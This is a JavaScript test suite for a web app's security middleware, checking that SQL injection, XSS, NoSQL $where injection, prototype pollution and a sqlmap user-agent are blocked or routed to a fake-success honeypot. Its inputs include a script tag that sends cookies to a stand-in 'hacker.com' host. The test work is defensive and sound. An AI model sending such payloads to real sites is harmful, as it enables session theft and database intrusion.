import { test, describe, before, after } from 'node:test';
import assert from 'node:assert';
import supertest from 'supertest';
import express from 'express';
import { z } from 'zod';
import app from '../src/app.js';
import { validate } from '../src/middleware/validate.js';
import { safeString, emailRule, passwordRule, usernameRule, textRule } from '../src/validations/common.js';
import { SEVERITY_LEVELS } from '../src/constants/securityPatterns.js';
import { securityLogger } from '../src/config/logger.js';


process.env.NODE_ENV = 'test';

describe('🛡️ Security System: WAF & Middleware', () => {
    test('1️⃣ Safe Request -> Should pass WAF and reach 404', async () => {
        const res = await supertest(app)
            .post('/api/random-endpoint')
            .send({ name: "John Doe", job: "Developer" });
        assert.strictEqual(res.status, 404, 'Safe request should bypass WAF and hit 404 handler');
        assert.strictEqual(res.body.success, false);
        assert.strictEqual(res.body.slug, 'NOT_FOUND');
    });
    test('2️⃣ SQL Injection -> Should trigger Honeypot (Fake 200 OK)', async () => {
        const payload = {
            query: "SELECT * FROM users WHERE id = 1 OR 1=1; --"
        };
        const res = await supertest(app)
            .post('/api/some-endpoint')
            .send(payload);
        assert.strictEqual(res.status, 200, 'Malicious SQLi should trigger fake success');
        assert.strictEqual(res.body.slug, 'OPERATION_SUCCESS');
        assert.strictEqual(res.body.data, null, 'Honeypot response should have no data');
    });

    test('3️⃣ XSS Attack -> Should trigger Honeypot (Fake 200 OK)', async () => {
        const payload = {
            comment: "<script>document.location='http://hacker.com/'+cookie</script>"
        };
        const res = await supertest(app)
            .post('/api/comments')
            .send(payload);
        assert.strictEqual(res.status, 200);
        assert.strictEqual(res.body.slug, 'OPERATION_SUCCESS');
    });
    test('4️⃣ Suspicious User-Agent -> Should Block with 403', async () => {
        const res = await supertest(app)
            .get('/health')
            .set('User-Agent', 'sqlmap/1.4.7');

        assert.strictEqual(res.status, 403, 'Should block scanning tools immediately');
        assert.strictEqual(res.body.message, 'You do not have permission to access this resource.');
    });
});
import { securityMiddleware } from '../src/middleware/security.middleware.js';

describe('🛡️ Zod Validation & Specific Rules', () => {
    const testApp = express();
    testApp.use(express.json());
    testApp.use(securityMiddleware); 
    const schema = z.object({
        body: z.object({
            username: usernameRule,
            email: emailRule,
            password: passwordRule,
            bio: textRule('Bio')
        })
    });
    testApp.post('/test-validation', validate(schema), (req, res) => {
        res.status(200).json({ success: true, message: 'Clean Data Received' });
    });

    test('5️⃣ Valid Data -> Should Pass Zod', async () => {
        const res = await supertest(testApp)
            .post('/test-validation')
            .send({
                username: "Ym_zerotwo",
                email: "test@example.com",
                password: "StrongPassword123!",
                bio: "Just a coding enthusiast."
            });

        assert.strictEqual(res.status, 200);
        assert.strictEqual(res.body.message, 'Clean Data Received');
    });

    test('6️⃣ Malicious Data in Zod Field -> Should trigger Honeypot', async () => {
        const res = await supertest(testApp)
            .post('/test-validation')
            .send({
                username: "SafeUser",
                email: "hacker@evil.com",
                password: "Password123! ' OR '1'='1"
            });
        assert.strictEqual(res.status, 200, 'Zod security check should also trigger honeypot');
        assert.strictEqual(res.body.slug, 'OPERATION_SUCCESS');
        assert.notEqual(res.body.message, 'Clean Data Received');
    });

    test('7️⃣ Invalid Data (Not Malicious) -> Should fail with 400', async () => {
        const res = await supertest(testApp)
            .post('/test-validation')
            .send({
                username: "   ",
                email: "not-an-email",
                password: "123"
            });
        assert.strictEqual(res.status, 400);
        assert.strictEqual(res.body.code, 400);
        if (process.env.NODE_ENV === 'development') {
            assert.ok(res.body.debug, 'Should return validation errors in dev mode');
            assert.ok(res.body.debug.error_message, 'Should have error message in debug');
        }
    });

    test('8️⃣ Malicious Bio (Normal Text) -> Should trigger Honeypot', async () => {
        const res = await supertest(testApp)
            .post('/test-validation')
            .send({
                username: "Ym_zerotwo",
                email: "test@example.com",
                password: "StrongPassword123!",
                bio: "Hello <script>alert('xss')</script> world"
            });
        assert.strictEqual(res.status, 200, 'Malicious bio should trigger honeypot');
        assert.strictEqual(res.body.slug, 'OPERATION_SUCCESS');
        assert.notEqual(res.body.message, 'Clean Data Received');
    });
});

describe('🕵️ Deceptive & Trickster Patterns', () => {
    const spyOnLogger = () => {
        const originalLog = securityLogger.log;
        let lastLog = null;
        securityLogger.log = (info) => {
            lastLog = info;
            console.log('\n🚨 [Security Test Audit] Threat Logged:', JSON.stringify(info, null, 2));
            return originalLog.call(securityLogger, info);
        };
        return {
            getLastLog: () => lastLog,
            restore: () => { securityLogger.log = originalLog; }
        };
    };

    test('9️⃣ Prototype Pollution Attempt (__proto__) -> Should accept (filtered) or Block', async () => {
        const loggerSpy = spyOnLogger();
        const payload = { "constructor": { "prototype": "hacked" } };
        const res = await supertest(app)
            .post('/api/auth/login')
            .send(payload);
        assert.strictEqual(res.status, 200, 'Should return Honeypot 200 OK');
        const log = loggerSpy.getLastLog();
        assert.ok(log, 'Security logger should have recorded the event');
        assert.ok(
            log.threats.some(t => t.type === 'PROTOTYPE_POLLUTION'),
            `Expected Prototype Pollution threat, got ${log.threats ? log.threats.map(t => t.type).join(', ') : 'no threats'}`
        );

        loggerSpy.restore();
    });

    test('🔟 Deeply Nested SQL Injection (The Matryoshka Attack) -> Should Block', async () => {
        const loggerSpy = spyOnLogger();
        const payload = {
            user: {
                profile: {
                    settings: {
                        theme: "dark",
                        bio: "nice guy",
                        metadata: {
                            trackingId: "105 OR 1=1; --"
                        }
                    }
                }
            }
        };

        const res = await supertest(app)
            .post('/api/user/update')
            .send(payload);
        assert.strictEqual(res.status, 200);
        const log = loggerSpy.getLastLog();
        assert.ok(log);
        assert.ok(
            log.threats.some(t => t.type === 'SQL_INJECTION' || t.type === 'SQL_LOGIC'),
            `Expected SQL threat, got ${log.threats.map(t => t.type).join(', ')}`
        );
        loggerSpy.restore();
    });

    test('1️⃣1️⃣ NoSQL Blind Injection ($where) -> Should Block', async () => {
        const loggerSpy = spyOnLogger();
        const stringPayload = {
            query: '{ $where: "this.password.length > 0" }'
        };
        const res = await supertest(app)
            .post('/api/search')
            .send(stringPayload);
        assert.strictEqual(res.status, 200);
        const log = loggerSpy.getLastLog();
        assert.ok(log);
        assert.ok(
            log.threats.some(t => t.type === 'NOSQL_INJECTION' || t.type === 'COMMAND_INJECTION'),
            `Expected NoSQL or Command threat, got ${log.threats.map(t => t.type).join(', ')}`
        );
        loggerSpy.restore();
    });
});
